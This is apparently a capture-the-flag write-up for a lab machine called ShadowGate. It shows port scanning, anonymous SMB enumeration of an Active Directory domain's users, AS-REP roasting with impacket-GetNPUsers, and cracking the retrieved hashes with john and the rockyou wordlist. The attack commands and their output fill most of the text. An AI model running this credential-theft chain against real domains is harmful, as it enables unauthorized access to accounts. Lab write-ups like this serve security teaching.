# ShadowGate

## Enumeration

> Nmap Scan Result&#x20;

```bash
rustscan -a 10.1.109.249 --  -sCV -T4 -Pn -oA nmap/rustscan
```



* Looks like we have many open ports&#x20;
* Let generate hosts file using `nxc` and then we will enumerate open ports using `nxc-sweeep`

```bash
nxc smb 10.1.109.249  -u '' -p '' --generate-hosts-file hosts
```

* Now time for `nxc-sweep` : which enumerates different modules like `ldap,smb,ssh,winrm,rdp` at once let's have a look at that

```bash
RDP         10.1.109.249    3389   DC01             [-] shadow.gate\ :  (STATUS_LOGON_FAILURE)
WINRM       10.1.109.249    5985   DC01             [-] shadow.gate\ : 
SMB         10.1.109.249    445    DC01             [-] shadow.gate\ :  STATUS_LOGON_FAILURE 
```

* All We can see is a logon\_failure , now lets enumerate users&#x20;

### Enumerating Users via NXC&#x20;

```bash
nxc smb 10.1.109.249 -u '' -p '' --users 
SMB         10.1.109.249    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
SMB         10.1.109.249    445    DC01             [+] shadow.gate\: 
SMB         10.1.109.249    445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.1.109.249    445    DC01             Administrator                 2026-01-11 11:33:05 0       Built-in account for administering the computer/domain 
SMB         10.1.109.249    445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.1.109.249    445    DC01             krbtgt                        2026-01-12 02:45:27 0       Key Distribution Center Service Account 
SMB         10.1.109.249    445    DC01             ATHENA                        2026-03-04 15:23:19 0        
SMB         10.1.109.249    445    DC01             mbrownlee                     2026-03-04 15:24:05 0        
SMB         10.1.109.249    445    DC01             bbrown                        2026-01-15 14:24:07 0        
SMB         10.1.109.249    445    DC01             jtrueblood                    2026-04-28 18:14:47 0        
SMB         10.1.109.249    445    DC01             jsmith                        2026-03-04 15:26:29 0        
SMB         10.1.109.249    445    DC01             clocke                        2026-03-04 15:24:32 0        
SMB         10.1.109.249    445    DC01             tclarke                       2026-03-04 15:25:33 0        
SMB         10.1.109.249    445    DC01             jbradford                     2026-03-04 15:24:59 0        
SMB         10.1.109.249    445    DC01             amoss                         2026-03-04 15:25:52 0        
SMB         10.1.109.249    445    DC01             [*] Enumerated 12 local users: SHADOW
```

```bash
awk 'NR > 3 {print $5}' users | head -n -1
```

```
Administrator
Guest
krbtgt
ATHENA
mbrownlee
bbrown
jtrueblood
jsmith
clocke
tclarke
jbradford
amoss
```

### AS-REP Roasting&#x20;

* Retrieving Hashes of Valid Users using `impacket-GetNPUsers`&#x20;

```bash
impacket-GetNPUsers shadow.gate/ -u user_list.txt -format hashcat -outputfile hashes -reques
```

* Brute-Forcing Userhash using `john`

```bash
head -n 5 hashes > forjohn  && john forjohn -w=/usr/share/wordlists/rockyou.txt
```

